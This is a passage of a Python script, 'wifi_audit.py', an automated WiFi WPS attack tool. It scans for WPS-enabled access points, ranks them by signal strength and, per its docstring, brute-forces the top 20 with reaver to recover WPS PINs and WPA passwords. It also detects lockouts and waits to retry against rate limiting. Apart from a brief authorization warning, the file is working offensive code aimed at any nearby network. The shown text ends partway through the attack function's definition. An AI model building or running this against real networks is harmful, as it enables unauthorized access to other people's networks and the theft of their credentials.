#!/usr/bin/env python3
"""
wifi_audit.py

Active WiFi WPS penetration testing tool.

Phase 1: Scans for WPS-enabled networks (1.0, 2.0, or Locked) using:
         - airodump-ng (live output parsing)
         - wash (WPS lock detection)
Phase 2: Attacks top 20 WPS-enabled targets by signal strength using reaver

Features:
- Live scan output parsing (no CSV files)
- Strict WPS filtering: only 1.0, 2.0, or Locked networks
- Union of airodump + wash results
- Intelligent WPS lock detection and retry logic
- Association mode fallback (no-association -> direct)
- Real-time progress tracking with curses TUI
- Results output in both CSV and table format

Usage:
    # Passive scan only (no attacks):
    sudo python3 wifi_audit.py -i wlan0mon --passive

    # Active attack mode (default 480s scan):
    sudo python3 wifi_audit.py -i wlan0mon

    # Use only airodump-ng (skip wash):
    sudo python3 wifi_audit.py -i wlan0mon --only-airodump

    # Use only wash (skip airodump):
    sudo python3 wifi_audit.py -i wlan0mon --only-wash

    # Custom scan duration:
    sudo python3 wifi_audit.py -i wlan0mon -a 120

Requires:
    - airodump-ng (from aircrack-ng)
    - wash (from reaver)
    - reaver
    - iwconfig
    - python3

WARNING: Only use on networks you own or have explicit authorization to test.
         Unauthorized access to computer networks is illegal.
"""

import argparse
import subprocess
import time
import sys
import re
import curses
import select
from collections import deque
from datetime import datetime
from dataclasses import dataclass
from typing import Dict, List


# ---------------------------------------------------------
# Constants
# ---------------------------------------------------------

# Important keywords for reaver output filtering
_IMPORTANT_KEYWORDS = (
    "[+]", "[!]", "WPS PIN", "WPA PSK", "WARNING",
    "Failed to associate", "rate limiting", "Detected AP"
)


# ---------------------------------------------------------
# Data Classes
# ---------------------------------------------------------

@dataclass
class AccessPoint:
    bssid: str
    pwr: int
    channel: str
    essid: str
    privacy: str
    cipher: str
    auth: str
    wps: str = "?"
    locked: str = "?"
    status: str = "PENDING"


@dataclass
class WPSAccessPoint:
    """WPS-enabled access point from airodump and/or wash scans."""
    bssid: str
    channel: str
    pwr: int
    essid: str
    privacy: str
    wps_version: str  # "1.0", "2.0", or "Locked"
    wps_locked: bool
    source: str  # "airodump", "wash", or "both"


@dataclass
class AttackResult:
    target_num: int
    bssid: str
    essid: str
    channel: str
    status: str  # SUCCESS | FAILED | LOCKED | PENDING | IN_PROGRESS
    wps_pin: str
    password: str
    time_spent: float
    retries: int
    current_pin: str = "-"
    pin_progress: int = 0  # Percentage 0-100
    pins_tried: int = 0  # Number of PINs tried so far
    total_pins: int = 11000  # Total possible WPS PINs (approximate)


# ---------------------------------------------------------
# WPS Results Manager
# ---------------------------------------------------------

class WPSResultsManager:
    """Manages union of airodump and wash WPS scan results.

    Only stores entries with WPS 1.0, 2.0, or Locked status.
    Maintains union - entries from either source are preserved.
    """

    # Valid WPS versions to capture
    VALID_WPS = ('1.0', '2.0', 'Locked', 'Lck')

    def __init__(self):
        self._results: Dict[str, WPSAccessPoint] = {}  # Keyed by BSSID (uppercase)

    def _normalize_wps(self, wps_value: str) -> tuple:
        """Normalize WPS value. Returns (wps_version, is_locked) or (None, None) if invalid."""
        wps = wps_value.strip()
        if wps in ('Locked', 'Lck'):
            return ('Locked', True)
        elif wps == '1.0':
            return ('1.0', False)
        elif wps == '2.0':
            return ('2.0', False)
        return (None, None)

    def add_from_airodump(self, bssid: str, channel: str, pwr: int,
                          essid: str, privacy: str, wps_value: str) -> bool:
        """Add entry from airodump scan. Returns True if added/updated."""
        wps_version, is_locked = self._normalize_wps(wps_value)
        if wps_version is None:
            return False

        bssid_key = bssid.upper()
        if bssid_key in self._results:
            # Always update PWR/CH/WPS values for existing entries
            existing = self._results[bssid_key]
            new_source = "both" if existing.source == "wash" else existing.source
            self._results[bssid_key] = WPSAccessPoint(
                bssid=bssid,
                channel=channel,
                pwr=pwr,
                essid=essid or existing.essid,
                privacy=privacy or existing.privacy,
                wps_version=wps_version,
                wps_locked=is_locked,
                source=new_source
            )
        else:
            self._results[bssid_key] = WPSAccessPoint(
                bssid=bssid,
                channel=channel,
                pwr=pwr,
                essid=essid,
                privacy=privacy,
                wps_version=wps_version,
                wps_locked=is_locked,
                source="airodump"
            )
        return True

    def add_from_wash(self, bssid: str, channel: str, pwr: int,
                      essid: str, wps_version: str, locked: bool) -> bool:
        """Add entry from wash scan. Returns True if added/updated."""
        # Wash provides version directly, normalize locked status
        if wps_version not in ('1.0', '2.0') and not locked:
            return False

        version = 'Locked' if locked else wps_version
        bssid_key = bssid.upper()

        if bssid_key in self._results:
            # Always update PWR/CH/WPS values for existing entries
            existing = self._results[bssid_key]
            new_source = "both" if existing.source == "airodump" else existing.source
            self._results[bssid_key] = WPSAccessPoint(
                bssid=bssid,
                channel=channel if channel else existing.channel,
                pwr=pwr if pwr != -999 else existing.pwr,
                essid=essid or existing.essid,
                privacy=existing.privacy,
                wps_version=version,
                wps_locked=locked,
                source=new_source
            )
        else:
            self._results[bssid_key] = WPSAccessPoint(
                bssid=bssid,
                channel=channel,
                pwr=pwr,
                essid=essid,
                privacy="",
                wps_version=version,
                wps_locked=locked,
                source="wash"
            )
        return True

    def get_all_results(self) -> List[WPSAccessPoint]:
        """Get all WPS results sorted by signal strength (strongest first)."""
        return sorted(
            self._results.values(),
            key=lambda x: x.pwr,
            reverse=True
        )

    def get_count(self) -> int:
        """Get total count of WPS entries."""
        return len(self._results)

    def get_as_dict_list(self) -> List[dict]:
        """Get results as list of dicts for TUI compatibility."""
        return [
            {
                'bssid': ap.bssid,
                'channel': ap.channel,
                'pwr': str(ap.pwr),
                'essid': ap.essid,
                'privacy': ap.privacy,
                'wps': ap.wps_version,
            }
            for ap in self.get_all_results()
        ]


# ---------------------------------------------------------
# TUI Manager
# ---------------------------------------------------------

class WifiAuditTUI:
    """Curses-based TUI manager for htop-style non-scrolling display."""

    def __init__(self, stdscr):
        self.stdscr = stdscr
        self.output_buffer = deque(maxlen=500)  # Increased buffer for scrolling
        self.enabled = True

        # Scan phase state for live table display
        self.scan_results = []  # Store discovered APs during scan phase
        self.scan_phase = True  # True during airodump/wash, False during attacks
        self.wash_started = False  # True once wash scan begins (switches to WPS-only view)

        # Scroll state for independent pane scrolling
        self.table_scroll_offset = 0  # Scroll position for table
        self.output_scroll_offset = 0  # Scroll position for output window
        self.active_pane = 'output'  # Which pane has keyboard focus ('table' or 'output')

        # Pane boundaries (updated during drawing)
        self.table_start_y = 0
        self.table_end_y = 0
        self.output_start_y = 0

        # Total items for scroll clamping
        self.table_total_items = 0
        self.output_total_lines = 0

        # Skip/cancel current target flag
        self.skip_current_target = False

        # Initialize curses colors
        try:
            curses.start_color()
            curses.use_default_colors()
            curses.init_pair(1, curses.COLOR_GREEN, -1)   # Success
            curses.init_pair(2, curses.COLOR_RED, -1)     # Failed/Error
            curses.init_pair(3, curses.COLOR_YELLOW, -1)  # Warning
            curses.init_pair(4, curses.COLOR_CYAN, -1)    # Info
            curses.init_pair(5, curses.COLOR_MAGENTA, -1) # In Progress
            curses.init_pair(6, curses.COLOR_WHITE, curses.COLOR_BLUE)  # Active pane indicator
        except:
            # Color support not available
            pass

        # Hide cursor
        try:
            curses.curs_set(0)
        except:
            pass

        # Enable mouse support
        try:
            curses.mousemask(curses.ALL_MOUSE_EVENTS | curses.REPORT_MOUSE_POSITION)
        except:
            pass

        # Set nodelay for non-blocking input
        self.stdscr.nodelay(True)

    def add_output_line(self, line: str):
        """Add a line to the output buffer."""
        if not self.enabled:
            print(line)
            return
        self.output_buffer.append(line)

    def update_progress_line(self, line: str, tag: str = "[SCAN]"):
        """Update the last line if it's a progress message, otherwise append."""
        if not self.enabled:
            print(f"\r{line}", end="", flush=True)
            return

        # If last line starts with the same tag, replace it
        if self.output_buffer and self.output_buffer[-1].startswith(tag):
            self.output_buffer[-1] = line
        else:
            self.output_buffer.append(line)

    def get_color_for_line(self, line: str) -> int:
        """Determine color pair based on line content."""
        if "[+]" in line or "SUCCESS" in line:
            return curses.color_pair(1)  # Green
        elif "[!]" in line or "WARNING" in line or "Failed" in line:
            return curses.color_pair(2)  # Red
        elif "Trying pin" in line or "IN_PROGRESS" in line:
            return curses.color_pair(5)  # Magenta
        elif "[*]" in line:
            return curses.color_pair(4)  # Cyan
        return 0

    def draw_header(self, stats: Dict, y_offset: int = 0) -> int:
        """Draw header with overall stats. Returns next y position."""
        max_y, max_x = self.stdscr.getmaxyx()
        y = y_offset

        try:
            # Title
            header = "=== WiFi WPS Attack Progress ==="
            self.stdscr.addstr(y, 0, header.ljust(max_x - 1), curses.A_BOLD)
            y += 1

            # Stats
            total = stats['total']
            completed = stats['completed']
            percent = int((completed / total) * 100) if total > 0 else 0

            cancelled = stats.get('cancelled', 0)
            timeout_count = stats.get('timeout', 0)
            stats_line = f"Overall: [{completed}/{total}] ({percent}%) | Success: {stats['success']} | Failed: {stats['failed']} | Locked: {stats['locked']} | Cancelled: {cancelled} | Timeout: {timeout_count}"
            self.stdscr.addstr(y, 0, stats_line.ljust(max_x - 1))
            y += 1

            # Separator
            separator = "=" * (max_x - 1)
            self.stdscr.addstr(y, 0, separator)
            y += 1

        except curses.error:
            pass

        return y

    def draw_targets_table(self, results: List[AttackResult], y_offset: int) -> int:
        """Draw targets table with independent scrolling. Returns next y position."""
        max_y, max_x = self.stdscr.getmaxyx()
        y = y_offset

        # Store table boundaries
        self.table_start_y = y
        total_targets = len(results)
        self.table_total_items = total_targets

        try:
            # Calculate available rows - limit to max 30% of terminal height
            max_table_rows = int(max_y * 0.30)
            available_rows = max(1, min(max_table_rows, total_targets))

            # Clamp scroll offset
            max_scroll = max(0, total_targets - available_rows)
            self.table_scroll_offset = max(0, min(self.table_scroll_offset, max_scroll))

            # Check if there are more items below visible area
            has_more_below = (self.table_scroll_offset + available_rows) < total_targets

            # Table header
            header = f"{'#':<3} | {'ESSID':<20} | {'BSSID':<17} | {'Session':<12} | {'Result/Progress':<40}"
            self.stdscr.addstr(y, 0, header[:max_x - 1], curses.A_BOLD)
            y += 1

            # Separator
            separator = "-" * (max_x - 1)
            self.stdscr.addstr(y, 0, separator)
            y += 1

            # Get visible slice based on scroll offset
            visible_results = results[self.table_scroll_offset:self.table_scroll_offset + available_rows]

            for result in visible_results:
                num = f"{result.target_num}"
                essid = result.essid[:20]
                bssid = result.bssid

                # Session status
                if result.status == "PENDING":
                    session = "Pending"
                elif result.status == "IN_PROGRESS":
                    session = "In Progress"
                elif result.status == "CANCELLED":
                    session = "Cancelled"
                elif result.status == "TIMEOUT":
                    session = "Timeout"
                elif result.status in ["SUCCESS", "FAILED", "LOCKED"]:
                    session = "Completed"
                else:
                    session = result.status

                # Result/Progress column
                if result.status == "PENDING":
                    progress = "-"
                    color = 0
                elif result.status == "IN_PROGRESS":
                    if result.current_pin != "-":
                        # Show PIN, fraction tried, and percentage
                        remaining = result.total_pins - result.pins_tried
                        progress = f"PIN: {result.current_pin} | {result.pins_tried}/{result.total_pins} ({remaining} left)"
                    else:
                        progress = "Initializing..."
                    color = curses.color_pair(5)  # Magenta
                elif result.status == "SUCCESS":
                    progress = f"SUCCESS | PIN: {result.wps_pin}"
                    color = curses.color_pair(1)  # Green
                elif result.status == "LOCKED":
                    progress = "LOCKED (rate limiting)"
                    color = curses.color_pair(2)  # Red
                elif result.status == "FAILED":
                    progress = "FAILED"
                    color = curses.color_pair(2)  # Red
                elif result.status == "CANCELLED":
                    progress = "Skipped by user"
                    color = curses.color_pair(3)  # Yellow
                elif result.status == "TIMEOUT":
                    progress = "Max time exceeded"
                    color = curses.color_pair(3)  # Yellow
                else:
                    progress = result.status
                    color = 0

                row = f"{num:<3} | {essid:<20} | {bssid:<17} | {session:<12} | {progress:<40}"
                self.stdscr.addstr(y, 0, row[:max_x - 1], color)
                y += 1

            # Show "more below" indicator
            if has_more_below:
                remaining = total_targets - self.table_scroll_offset - available_rows
                more_indicator = f"▼ {remaining} more below ▼"
                self.stdscr.addstr(y, 0, more_indicator[:max_x - 1], curses.A_DIM)
                y += 1

        except curses.error:
            pass

        # Store table end position
        self.table_end_y = y

        return y

    def draw_scan_table(self, y_offset: int) -> int:
        """Draw discovered networks during scan phase. Returns next y position.

        Only displays networks with WPS 1.0, 2.0, or Locked status.
        Supports scrolling, limited to max 30% terminal height.
        """
        max_y, max_x = self.stdscr.getmaxyx()
        y = y_offset

        # Strict filter: only show WPS 1.0, 2.0, or Locked
        display_aps = [
            ap for ap in self.scan_results
            if ap.get('wps', '') in ('1.0', '2.0', 'Locked', 'Lck')
        ]

        # Count totals for header
        total_wps = len(display_aps)
        self.table_total_items = total_wps

        # Store table start position
        self.table_start_y = y

        try:
            # Calculate available rows - limit to max 30% of terminal height
            max_table_rows = int(max_y * 0.30)
            available_rows = max(1, min(max_table_rows, total_wps))

            # Clamp scroll offset
            max_scroll = max(0, total_wps - available_rows)
            self.table_scroll_offset = max(0, min(self.table_scroll_offset, max_scroll))

            # Check if there are more items below visible area
            has_more_below = (self.table_scroll_offset + available_rows) < total_wps

            # Table header
            header = f"{'#':<3} | {'ESSID':<20} | {'BSSID':<17} | {'CH':<3} | {'PWR':<4} | {'ENC':<8} | {'WPS':<6} [Total: {total_wps}]"
            self.stdscr.addstr(y, 0, header[:max_x - 1], curses.A_BOLD)
            y += 1

            separator = "-" * min(len(header), max_x - 1)
            self.stdscr.addstr(y, 0, separator)
            y += 1

            # Get visible slice based on scroll offset
            visible_aps = display_aps[self.table_scroll_offset:self.table_scroll_offset + available_rows]

            # Show rows
            for idx, ap in enumerate(visible_aps):
                actual_idx = self.table_scroll_offset + idx + 1  # 1-based index
                num = f"{actual_idx}"

                # Show placeholder for hidden networks
                essid = ap.get('essid', '').strip()
                if not essid:
                    essid = '<< Hidden ESSID >>'
                essid = essid[:20]

                bssid = ap.get('bssid', '')
                channel = ap.get('channel', '')[:3]
                pwr = str(ap.get('pwr', ''))[:4]
                enc = ap.get('privacy', '')[:8]
                wps = ap.get('wps', '?')[:6]

                # Color based on WPS status
                if wps in ('Locked', 'Lck'):
                    color = curses.color_pair(3)  # Yellow - WPS locked
                else:
                    color = curses.color_pair(1)  # Green - WPS 1.0/2.0

                row = f"{num:<3} | {essid:<20} | {bssid:<17} | {channel:<3} | {pwr:<4} | {enc:<8} | {wps:<6}"
                self.stdscr.addstr(y, 0, row[:max_x - 1], color)
                y += 1

            # Show "more below" indicator
            if has_more_below:
                remaining = total_wps - self.table_scroll_offset - available_rows
                more_indicator = f"▼ {remaining} more below ▼"
                self.stdscr.addstr(y, 0, more_indicator[:max_x - 1], curses.A_DIM)
                y += 1

        except curses.error:
            pass

        # Store table end position
        self.table_end_y = y

        return y

    def draw_output_window(self, y_offset: int):
        """Draw the live output window (always shows latest lines, no scrolling)."""
        max_y, max_x = self.stdscr.getmaxyx()

        # Store output window start position
        self.output_start_y = y_offset

        try:
            # Output window header
            y = y_offset
            separator = "=" * (max_x - 1)
            self.stdscr.addstr(y, 0, separator)
            y += 1

            # Header (no pane markers since output is not scrollable)
            header = "=== Live Audit Output ==="
            self.stdscr.addstr(y, 0, header.ljust(max_x - 1)[:max_x - 1], curses.A_BOLD)
            y += 1

            separator = "=" * (max_x - 1)
            self.stdscr.addstr(y, 0, separator)
            y += 1

            # Calculate available lines for content
            available_lines = max(1, max_y - y - 1)  # Reserve 1 for footer

            # Get all lines as a list and show only the latest (tail behavior)
            all_lines = list(self.output_buffer)
            total_lines = len(all_lines)

            # Always show the most recent lines
            if total_lines > available_lines:
                visible_lines = all_lines[-available_lines:]
            else:
                visible_lines = all_lines

            for line in visible_lines:
                if y >= max_y - 1:
                    break

                color = self.get_color_for_line(line)
                display_line = line[:max_x - 1]
                self.stdscr.addstr(y, 0, display_line, color)
                y += 1

        except curses.error:
            pass

    def refresh_display(self, results: List[AttackResult], stats: Dict):
        """Refresh the entire display."""
        if not self.enabled:
            return

        try:
            # Handle any pending input (keyboard/mouse scrolling)
            self.handle_input()

            # Use erase() instead of clear() to avoid flicker
            # erase() just marks cells for overwrite, clear() causes visible blank
            self.stdscr.erase()

            # Draw components
            y = 0
            y = self.draw_header(stats, y)

            # During scan phase, show discovered networks; during attack, show targets
            if self.scan_phase and self.scan_results:
                y = self.draw_scan_table(y)
            else:
                y = self.draw_targets_table(results, y)

            self.draw_output_window(y)

            # Draw help footer - only show skip hint during attack phase
            max_y, max_x = self.stdscr.getmaxyx()
            if not self.scan_phase:
                help_text = "[s] Skip current target"
                try:
                    self.stdscr.addstr(max_y - 1, 0, help_text[:max_x - 1], curses.A_DIM)
                except curses.error:
                    pass

            # Use noutrefresh + doupdate for flicker-free refresh
            self.stdscr.noutrefresh()
            curses.doupdate()

        except curses.error as e:
            # Log curses errors - screen might be too small
            self.enabled = False
            raise Exception(f"Curses error in refresh_display: {e}. Terminal might be too small.")
        except Exception as e:
            self.enabled = False
            raise

    def print(self, message: str):
        """Print a message (adds to output buffer and refreshes)."""
        if not self.enabled:
            print(message)
            return
        self.add_output_line(message)

    def handle_input(self):
        """Handle keyboard and mouse input for table scrolling and skip command."""
        if not self.enabled:
            return

        try:
            key = self.stdscr.getch()
            if key == -1:
                return  # No input

            # Calculate visible rows for table
            table_visible_rows = max(1, self.table_end_y - self.table_start_y - 2)

            # Handle mouse events (only for table scrolling)
            if key == curses.KEY_MOUSE:
                try:
                    _, mx, my, _, bstate = curses.getmouse()

                    # Only scroll if mouse is over table area
                    mouse_in_table = self.table_start_y <= my < self.table_end_y

                    if mouse_in_table:
                        max_offset = max(0, self.table_total_items - table_visible_rows)

                        # Scroll wheel up (button 4)
                        if bstate & curses.BUTTON4_PRESSED:
                            self.table_scroll_offset = max(0, self.table_scroll_offset - 3)
                        # Scroll wheel down (button 5)
                        elif bstate & (curses.BUTTON5_PRESSED if hasattr(curses, 'BUTTON5_PRESSED') else 0x200000):
                            self.table_scroll_offset = min(max_offset, self.table_scroll_offset + 3)
                        # Alternative scroll detection
                        elif bstate & 0x10000:
                            self.table_scroll_offset = max(0, self.table_scroll_offset - 3)
                        elif bstate & 0x200000:
                            self.table_scroll_offset = min(max_offset, self.table_scroll_offset + 3)

                except curses.error:
                    pass
                return

            # 's' key - skip/cancel current target (only during attack phase)
            if key == ord('s'):
                if not self.scan_phase:
                    self.skip_current_target = True
                    self.add_output_line("[!] Skip requested - cancelling current target...")
                return

            # Table scrolling (always active, no pane switching needed)
            max_offset = max(0, self.table_total_items - table_visible_rows)

            # Up arrow or 'k'
            if key in (curses.KEY_UP, ord('k')):
                self.table_scroll_offset = max(0, self.table_scroll_offset - 1)
            # Down arrow or 'j'
            elif key in (curses.KEY_DOWN, ord('j')):
                self.table_scroll_offset = min(max_offset, self.table_scroll_offset + 1)
            # Page Up
            elif key == curses.KEY_PPAGE:
                self.table_scroll_offset = max(0, self.table_scroll_offset - table_visible_rows)
            # Page Down
            elif key == curses.KEY_NPAGE:
                self.table_scroll_offset = min(max_offset, self.table_scroll_offset + table_visible_rows)
            # Home
            elif key == curses.KEY_HOME:
                self.table_scroll_offset = 0
            # End
            elif key == curses.KEY_END:
                self.table_scroll_offset = max_offset

        except curses.error:
            pass


# ---------------------------------------------------------
# Helpers
# ---------------------------------------------------------

def check_monitor_mode(interface: str) -> bool:
    """Verify interface is in monitor mode."""
    try:
        output = subprocess.check_output(
            ["iwconfig", interface],
            stderr=subprocess.STDOUT
        ).decode()
        return "Mode:Monitor" in output
    except subprocess.CalledProcessError:
        return False


def run_airodump_live(interface: str, duration: int, results_manager: WPSResultsManager,
                      tui=None) -> None:
    """Run airodump-ng and parse live output for WPS 1.0/2.0/Locked networks.

    Uses PTY to capture ncurses output (airodump doesn't output to stdout).
    Only captures networks with WPS version 1.0, 2.0, or Locked status.
    """
    import pty
    import os
    import select

    tui_print(f"[+] Running airodump-ng for {duration} seconds (WPS 1.0/2.0/Locked only)...", tui)

    # Create pseudo-terminal to capture airodump ncurses output
    master_fd, slave_fd = pty.openpty()

    # Run airodump-ng with --wps flag using PTY
    proc = subprocess.Popen(
        ["sudo", "timeout", str(duration),
         "airodump-ng", "--wps", "-a", "--berlin", "0", interface],
        stdout=slave_fd,
        stderr=slave_fd,
        stdin=subprocess.DEVNULL
    )
    os.close(slave_fd)  # Close slave in parent process

    # Regex to strip ANSI escape codes
    ansi_escape = re.compile(r'\x1b\[[0-9;]*[a-zA-Z]|\x1b\[[\?0-9;]*[a-zA-Z]|\x1b\[\d*[A-Za-z]')

    # Regex pattern to parse airodump output line
    # Format: BSSID  PWR  Beacons  #Data  #/s  CH  MB  ENC  CIPHER  AUTH  WPS  ESSID
    # Example: AA:BB:CC:DD:EE:FF  -45  100  50  0  6  54e  WPA2  CCMP  PSK  2.0  NetworkName
    ap_pattern = re.compile(
        r'([0-9A-Fa-f:]{17})\s+'  # BSSID
        r'(-?\d+)\s+'              # PWR
        r'\d+\s+'                  # Beacons
        r'\d+\s+'                  # #Data
        r'\d+\s+'                  # #/s
        r'(\d+)\s+'                # CH (channel)
        r'[\d\w.e-]+\s+'           # MB (speed)
        r'(\S+)\s+'                # ENC (encryption)
        r'(\S+)\s+'                # CIPHER
        r'(\S+)\s+'                # AUTH
        r'([\d.]+|Locked|Lck|No)\s*'  # WPS
        r'(.*)$'                   # ESSID
    )

    start = time.time()
    bar_width = 40
    buffer = ""

    try:
        while proc.poll() is None:
            elapsed = int(time.time() - start)
            progress = min(elapsed / duration, 1)
            filled = int(bar_width * progress)
            bar = "█" * filled + "░" * (bar_width - filled)
            percent = int(progress * 100)

            # Try to read available output from PTY (non-blocking)
            try:
                ready, _, _ = select.select([master_fd], [], [], 0.3)
                if ready:
                    data = os.read(master_fd, 8192).decode(errors='ignore')
                    buffer += data

                    # Process complete lines in buffer
                    while '\n' in buffer:
                        line, buffer = buffer.split('\n', 1)
                        # Strip ANSI codes
                        clean_line = ansi_escape.sub('', line).strip()

                        # Skip empty or header lines
                        if not clean_line or 'BSSID' in clean_line or 'PWR' in clean_line:
                            continue
                        if 'CH' in clean_line and 'MB' in clean_line:
                            continue

                        # Try to parse AP line
                        match = ap_pattern.search(clean_line)
                        if match:
                            bssid, pwr, channel, enc, cipher, auth, wps, essid = match.groups()

                            # Only add if WPS is 1.0, 2.0, or Locked
                            if wps in ('1.0', '2.0', 'Locked', 'Lck'):
                                pwr_int = int(pwr) if pwr else -999
                                results_manager.add_from_airodump(
                                    bssid=bssid,
                                    channel=channel,
                                    pwr=pwr_int,
                                    essid=essid.strip(),
                                    privacy=enc,
                                    wps_value=wps
                                )
            except OSError:
                # PTY closed
                break
            except Exception:
                pass

            # Update progress bar
            wps_count = results_manager.get_count()
            msg = f"[SCAN] |{bar}| {percent}% ({elapsed}/{duration}s) | WPS 1.0/2.0/Locked: {wps_count}"

            if tui and tui.enabled:
                tui.scan_results = results_manager.get_as_dict_list()
                tui.update_progress_line(msg, "[SCAN]")
                dummy_stats = {'total': 0, 'completed': 0, 'success': 0, 'failed': 0, 'locked': 0}
                tui.refresh_display([], dummy_stats)
            else:
                print(f"\r{msg}", end="", flush=True)

            if elapsed >= duration:
                break

    finally:
        # Clean up PTY
        try:
            os.close(master_fd)
        except OSError:
            pass

    proc.wait()

    # Log if airodump exited with error (ignore timeout signal -9/124)
    if proc.returncode and proc.returncode not in (0, -9, 124):
        tui_print(f"[!] airodump-ng exited with code {proc.returncode}", tui)

    if not (tui and tui.enabled):
        print()  # Newline for legacy mode

    wps_count = results_manager.get_count()
    tui_print(f"[+] Finished airodump scan. Found {wps_count} WPS 1.0/2.0/Locked networks.", tui)


def run_wash(interface: str, duration: int, results_manager: WPSResultsManager,
             tui=None) -> None:
    """Run wash and add WPS 1.0/2.0/Locked networks to results manager.

    Parses wash output and adds entries with WPS 1.0, 2.0, or Locked status.
    Maintains union with airodump results - does not remove existing entries.
    """
    import select

    # Switch TUI to WPS-only view mode
    if tui and tui.enabled:
        tui.wash_started = True

    tui_print(f"[+] Running wash for {duration} seconds (WPS 1.0/2.0/Locked only)...", tui)

    # Run wash in background
    proc = subprocess.Popen(
        ["timeout", str(duration), "wash", "-i", interface],
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL
    )

    # Show progress bar while scanning, reading output incrementally
    start = time.time()
    bar_width = 40

    def parse_wash_line(line: str) -> bool:
        """Parse a wash output line and add to results. Returns True if added."""
        # Wash output format:
        # BSSID              Ch  dBm  WPS  Lck  Vendor    ESSID
        # AA:BB:CC:DD:EE:FF   6  -45  1.0  No   Unknown   NetworkName
        if ":" not in line or "BSSID" in line:
            return False

        parts = line.split()
        if len(parts) < 6:
            return False

        try:
            bssid = parts[0]
            channel = parts[1]
            rssi = parts[2]
            wps_ver = parts[3]
            locked_str = parts[4]
            # ESSID is everything after vendor (parts[5])
            essid = ' '.join(parts[6:]) if len(parts) > 6 else ''

            # Only add if WPS is 1.0, 2.0, or Locked
            is_locked = locked_str.lower() == 'yes'
            if wps_ver not in ('1.0', '2.0') and not is_locked:
                return False

            pwr = int(rssi) if rssi.lstrip('-').isdigit() else -999

            return results_manager.add_from_wash(
                bssid=bssid,
                channel=channel,
                pwr=pwr,
                essid=essid,
                wps_version=wps_ver,
                locked=is_locked
            )
        except (ValueError, IndexError):
            return False

    while proc.poll() is None:
        elapsed = int(time.time() - start)
        progress = min(elapsed / duration, 1)
        filled = int(bar_width * progress)
        bar = "█" * filled + "░" * (bar_width - filled)
        percent = int(progress * 100)

        # Try to read any available output (non-blocking)
        try:
            ready, _, _ = select.select([proc.stdout], [], [], 0.1)
            if ready:
                line = proc.stdout.readline()
                if line:
                    decoded_line = line.decode(errors='ignore').strip()
                    parse_wash_line(decoded_line)
        except Exception:
            pass

        # Update progress bar
        wps_count = results_manager.get_count()
        msg = f"[WASH] |{bar}| {percent}% ({elapsed}/{duration}s) | WPS 1.0/2.0/Locked: {wps_count}"

        if tui and tui.enabled:
            tui.scan_results = results_manager.get_as_dict_list()
            tui.update_progress_line(msg, "[WASH]")
            dummy_stats = {'total': 0, 'completed': 0, 'success': 0, 'failed': 0, 'locked': 0}
            tui.refresh_display([], dummy_stats)
        else:
            print(f"\r{msg}", end="", flush=True)

        if elapsed >= duration:
            break
        time.sleep(0.3)

    # Read any remaining output
    try:
        remaining = proc.stdout.read()
        if remaining:
            for line in remaining.decode(errors='ignore').splitlines():
                parse_wash_line(line.strip())
    except Exception:
        pass

    proc.wait()

    # Log if wash exited with error (ignore timeout signal -9/124)
    if proc.returncode and proc.returncode not in (0, -9, 124):
        tui_print(f"[!] wash exited with code {proc.returncode}", tui)

    if not (tui and tui.enabled):
        print()  # New line after progress bar for legacy mode

    wps_count = results_manager.get_count()
    tui_print(f"[+] Finished wash scan. Total WPS 1.0/2.0/Locked: {wps_count}", tui)


def detect_wps_lock(output_line: str) -> bool:
    """Detect if reaver output indicates WPS lock."""
    lock_patterns = [
        "WARNING: Failed to associate",
        "WPS transaction failed",
        "Detected AP rate limiting",
        "Receive timeout occurred",
        "WPS transaction failed (code: 0x03)"
    ]
    return any(pattern in output_line for pattern in lock_patterns)


def tui_print(message: str, tui=None):
    """Print message using TUI if available, otherwise regular print."""
    if tui and tui.enabled:
        tui.add_output_line(message)
    else:
        print(message)


def wait_with_countdown(seconds: int, reason: str = "WPS lock detected", tui=None, results=None, stats=None):
    """Display countdown timer."""
    tui_print(f"\n[!] {reason}, waiting {seconds // 60} minutes...", tui)
    end_time = time.time() + seconds

    while time.time() < end_time:
        remaining = int(end_time - time.time())
        mins, secs = divmod(remaining, 60)
        msg = f"[WAIT] {mins:02d}:{secs:02d} remaining..."
        if tui and tui.enabled:
            # Use update_progress_line instead of add_output_line to avoid filling buffer
            tui.update_progress_line(msg, "[WAIT]")
            # Refresh display to show countdown
            if results is not None and stats is not None:
                tui.refresh_display(results, stats)
            time.sleep(1)
        else:
            print(f"\r{msg}", end="", flush=True)
            time.sleep(1)

    tui_print("[+] Resuming attack...", tui)


def update_targets_table(results: List[AttackResult], stats: Dict, tui=None):
    """
    Update and display the fixed targets table at top of screen.
    This shows all targets with their current status and progress.
    """
    # Use TUI if available, otherwise fallback to legacy print mode
    if tui and tui.enabled:
        tui.refresh_display(results, stats)
        return

    # Legacy mode (--no-curses): Move cursor to home position and clear screen
    print("\033[2J\033[H", end="", flush=True)

    # Header
    print("=" * 120)
    print("=== WiFi WPS Attack Progress ===")
    print("=" * 120)

    total = stats['total']
    completed = stats['completed']
    percent = int((completed / total) * 100) if total > 0 else 0

    print(f"Overall Progress: [{completed}/{total}] ({percent}%) | Success: {stats['success']} | Failed: {stats['failed']} | Locked: {stats['locked']}")
    print("=" * 120)

    # Table header
    print(f"{'#':<3} | {'ESSID':<20} | {'BSSID':<17} | {'Session':<12} | {'Result/Progress':<55}")
    print("-" * 120)

    # Table rows
    for result in results:
        num = f"{result.target_num}"
        essid = result.essid[:20]
        bssid = result.bssid

        # Session status
        if result.status == "PENDING":
            session = "Pending"
        elif result.status == "IN_PROGRESS":
            session = "In Progress"
        elif result.status in ["SUCCESS", "FAILED", "LOCKED"]:
            session = "Completed"
        else:
            session = result.status

        # Result/Progress column
        if result.status == "PENDING":
            progress = "-"
        elif result.status == "IN_PROGRESS":
            if result.current_pin != "-":
                progress = f"Testing PIN: {result.current_pin} | Progress: {result.pin_progress}%"
            else:
                progress = "Initializing attack..."
        elif result.status == "SUCCESS":
            progress = f"SUCCESS | PIN: {result.wps_pin} | Pass: {result.password}"
        elif result.status == "LOCKED":
            progress = f"LOCKED (WPS rate limiting detected, max retries reached)"
        elif result.status == "FAILED":
            progress = f"FAILED (no WPS PIN found)"
        else:
            progress = result.status

        print(f"{num:<3} | {essid:<20} | {bssid:<17} | {session:<12} | {progress:<55}")

    print("=" * 120)
    print("\n=== Live Audit Output ===\n")


def run_reaver_attack(target: AccessPoint, interface: str, result_obj: AttackResult,
                      stats: Dict, all_results: List[AttackResult],
                      max_retries: int = 10, verbose: bool = False, tui=None,
